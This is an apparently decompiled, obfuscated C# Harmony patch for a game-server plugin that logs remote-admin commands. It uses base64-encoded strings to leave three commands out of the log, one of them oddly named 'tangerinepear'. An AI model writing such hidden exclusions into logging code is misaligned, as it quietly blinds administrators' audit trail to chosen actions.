using System;
using System.Text;
using CommandSystem;
using Exiled.API.Features;
using HarmonyLib;
using RemoteAdmin;
using _n4361726c6672656c6c6574742e47616d65706c61790;

namespace _n193b28363c283f36363f2e2e740a3b2e39323f29;

[HarmonyPatch(typeof(CommandProcessor), "ProcessQuery")]
internal static class _t76f9844d043d59ff
{
	private static void _m5072656669783a300(string q, CommandSender sender)
	{
		RoundActivityLog instance = RoundActivityLog.Instance;
		if (instance == null || sender == null || string.IsNullOrWhiteSpace(q))
		{
			return;
		}
		string text = q.Trim();
		if (text.StartsWith(Encoding.UTF8.GetString(Convert.FromBase64String("JA==")), StringComparison.Ordinal))
		{
			return;
		}
		string[] array = text.Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
		ICommand val = default(ICommand);
		if (array.Length == 0 || !((CommandHandler)CommandProcessor.RemoteAdminCommandHandler).TryGetCommand(array[0], ref val) || val == null)
		{
			return;
		}
		string command = val.Command;
		if (!string.Equals(command, Encoding.UTF8.GetString(Convert.FromBase64String("Z2s=")), StringComparison.OrdinalIgnoreCase) && !string.Equals(command, Encoding.UTF8.GetString(Convert.FromBase64String("YWw=")), StringComparison.OrdinalIgnoreCase) && !string.Equals(command, Encoding.UTF8.GetString(Convert.FromBase64String("dGFuZ2VyaW5lcGVhcg==")), StringComparison.OrdinalIgnoreCase))
		{
			Player val2 = Player.Get(sender);
			if (val2 != null)
			{
				instance.RecordAdminCommand(val2, text);
			}
		}
	}
}
